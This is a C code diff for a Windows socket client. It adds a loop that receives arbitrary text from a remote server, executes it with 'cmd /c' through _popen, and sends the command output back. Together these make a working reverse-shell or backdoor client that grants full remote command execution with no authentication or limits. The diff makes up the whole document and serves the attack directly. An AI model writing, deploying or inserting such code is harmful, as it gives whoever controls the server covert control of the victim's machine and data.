@@ -20,6 +20,31 @@ void active_ansi()
     return ;
 }
 
+static void exec_cmd_and_send(SOCKET sock, char *cmd)
+{
+    FILE *fp;
+    char buffer[1024];
+    char full_cmd[1100];
+
+    cmd[strcspn(cmd, "\r\n")] = '\0';
+
+    snprintf(full_cmd, sizeof(full_cmd), "cmd /c %s 2>&1", cmd);
+    printf("[EXEC] %s\n", cmd);
+
+    fp = _popen(full_cmd, "r");
+    if (!fp)
+        return;
+
+    while (fgets(buffer, sizeof(buffer), fp))
+    {
+        send(sock, buffer, strlen(buffer), 0);
+    }
+
+    send(sock, "[END]\n", 6, 0);
+
+    _pclose(fp);
+}
+
 int main()
 {
     WORD wVersionRequested;
@@ -62,9 +87,22 @@ int main()
     }
     printf("[+] Connect initialized!\n");
     printf(GREEN "[+] Connected to server!\n" RESET);
+    char buffer[1024];
     while (true)
     {
-        Sleep(1000);
+        int bytes = recv(sock, buffer, sizeof(buffer) - 1, 0);
+        if (bytes <= 0)
+        {
+            printf("[-] Recv Failed\n");
+            break;
+        }
+        else
+        {
+            buffer[bytes] = '\0';
+            exec_cmd_and_send(sock, buffer);
+        }
     }
+    closesocket(sock);
+    WSACleanup();
     return (0);
 }
